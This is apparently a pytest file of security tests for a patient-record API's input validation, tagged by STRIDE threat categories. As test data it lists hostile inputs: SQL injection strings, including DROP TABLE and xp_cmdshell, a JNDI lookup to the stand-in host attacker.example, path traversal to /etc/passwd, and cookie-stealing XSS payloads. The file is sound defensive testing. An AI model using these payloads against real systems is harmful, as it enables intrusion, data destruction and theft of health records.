"""Input validation tests.

STRIDE: Tampering (T) and Elevation of Privilege (E).
Threat: crafted input alters stored data, injects executable content into the
frontend, or sets fields the client should not control.
Control: server-side whitelist validation in common.parse_body().
"""
import json

import pytest


def body(payload):
    return {"body": json.dumps(payload)}


BASE = {
    "first_name": "Sarah",
    "last_name": "Chen",
    "date_of_birth": "1985-03-14",
    "health_card": "1234567890",
}


@pytest.mark.stride("Tampering")
def test_valid_record_is_accepted(sec, valid_record):
    parsed = sec.parse_body(body(valid_record), require_all=True)
    assert parsed["first_name"] == "Sarah"
    assert parsed["health_card"] == "1234567890"


# --------------------------------------------------------------- injection --
INJECTION_PAYLOADS = [
    "Robert'); DROP TABLE patients;--",
    "admin' OR '1'='1",
    "'; EXEC xp_cmdshell('dir');--",
    '" OR 1=1 --',
    "${jndi:ldap://attacker.example/x}",
    "../../etc/passwd",
    "%00nulbyte",
]


@pytest.mark.stride("Tampering")
@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_injection_payloads_rejected(sec, payload):
    with pytest.raises(sec.ValidationError):
        sec.parse_body(body({**BASE, "first_name": payload}), require_all=True)


XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg/onload=alert(1)>",
    "<iframe src='evil.example'></iframe>",
]


@pytest.mark.stride("Tampering")
@pytest.mark.parametrize("payload", XSS_PAYLOADS)
def test_xss_payloads_rejected(sec, payload):
    with pytest.raises(sec.ValidationError):
        sec.parse_body(body({**BASE, "last_name": payload}), require_all=True)


@pytest.mark.stride("Tampering")
def test_error_message_never_echoes_the_payload(sec):
    """A reflected payload in an error body is itself an XSS vector."""
    payload = "<script>alert('xss')</script>"
    with pytest.raises(sec.ValidationError) as exc:
        sec.parse_body(body({**BASE, "first_name": payload}), require_all=True)
    assert payload not in str(exc.value)
    assert "script" not in str(exc.value).lower()


# ------------------------------------------------------- mass assignment ----
@pytest.mark.stride("Elevation of Privilege")
@pytest.mark.parametrize("field", ["is_admin", "role", "integrity", "patient_id", "created_at"])
def test_unknown_and_server_managed_fields_rejected(sec, field):
    """Whitelist blocks privilege escalation and forged integrity hashes."""
    with pytest.raises(sec.ValidationError):
        sec.parse_body(body({**BASE, field: "attacker-controlled"}), require_all=True)


# ------------------------------------------------------------ field rules ---
@pytest.mark.stride("Tampering")
@pytest.mark.parametrize("value", ["12345", "abcdefghij", "123456789012", "", "1234-56789"])
def test_health_card_must_be_ten_digits(sec, value):
    with pytest.raises(sec.ValidationError):
        sec.parse_body(body({**BASE, "health_card": value}), require_all=True)


@pytest.mark.stride("Tampering")
@pytest.mark.parametrize("value", ["2099-01-01", "1899-12-31", "14-03-1985", "not-a-date", "1985-13-45"])
def test_invalid_dates_rejected(sec, value):
    with pytest.raises(sec.ValidationError):
        sec.parse_body(body({**BASE, "date_of_birth": value}), require_all=True)


@pytest.mark.stride("Tampering")
@pytest.mark.parametrize("value", ["plainstring", "a@b", "@example.ca", "a b@example.ca"])
def test_invalid_emails_rejected(sec, value):
    with pytest.raises(sec.ValidationError):
        sec.parse_body(body({**BASE, "email": value}), require_all=True)


@pytest.mark.stride("Denial of Service")
def test_oversized_field_rejected(sec):
    with pytest.raises(sec.ValidationError):
        sec.parse_body(body({**BASE, "clinical_notes": "x" * 5000}), require_all=True)


@pytest.mark.stride("Denial of Service")
def test_oversized_body_rejected(sec):
    huge = {"body": "x" * 20_000}
    with pytest.raises(sec.ValidationError):
        sec.parse_body(huge, require_all=True)


@pytest.mark.stride("Tampering")
def test_missing_required_fields_rejected(sec):
    with pytest.raises(sec.ValidationError) as exc:
        sec.parse_body(body({"first_name": "Sarah"}), require_all=True)
    assert "Missing required" in str(exc.value)


@pytest.mark.stride("Tampering")
def test_malformed_json_rejected(sec):
    with pytest.raises(sec.ValidationError):
        sec.parse_body({"body": "{not valid json"}, require_all=True)


@pytest.mark.stride("Tampering")
def test_non_object_body_rejected(sec):
    with pytest.raises(sec.ValidationError):
        sec.parse_body({"body": json.dumps(["a", "list"])}, require_all=True)


@pytest.mark.stride("Tampering")
@pytest.mark.parametrize("pid", [
    "not-a-uuid", "../../admin", "'; DROP TABLE--", "",
    "2c8500aa-1eed-44dc-b1e7", "00000000-0000-0000-0000-000000000000",
])
def test_invalid_patient_ids_rejected(sec, pid):
    assert not sec.valid_patient_id(pid)


@pytest.mark.stride("Tampering")
def test_valid_uuid_accepted(sec):
    assert sec.valid_patient_id("2c8500aa-1eed-44dc-b1e7-000ea0fb1f8c")
